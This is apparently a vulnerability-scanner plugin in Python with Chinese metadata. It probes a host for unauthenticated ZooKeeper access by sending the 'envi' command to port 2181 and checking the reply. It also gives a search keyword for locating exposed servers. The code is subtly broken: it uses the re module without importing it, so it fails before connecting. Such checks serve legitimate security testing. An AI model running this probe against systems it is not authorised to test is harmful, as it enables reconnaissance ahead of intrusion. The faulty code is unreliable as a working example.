#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket

def get_plugin_info():
    plugin_info = {
        "name": "Zookeeper 未授权",
        "desc": "导致数据库敏感信息泄露，严重可导致服务器被入侵。",
        "grade": "高",
        "type": "service",
        "keyword": "service:zookeeper port:2181",
    }
    return plugin_info

def poc(arg):
    check_port = lambda x:x if re.match(r"(.*?):(\d+)$",x) else x+':2181'
    host,port = check_port(arg).split(':')
    timeout = 5
    payload = b'envi'
    s = socket.socket()
    socket.setdefaulttimeout(timeout)
    try:
        s.connect((host,int(port)))
        s.send(payload)
        recvdata = s.recv(1024)
        s.close()
        if recvdata and b'Environment' in recvdata:
            return True
        else:
            return False
    except Exception:
        return

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} IP[:port]".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

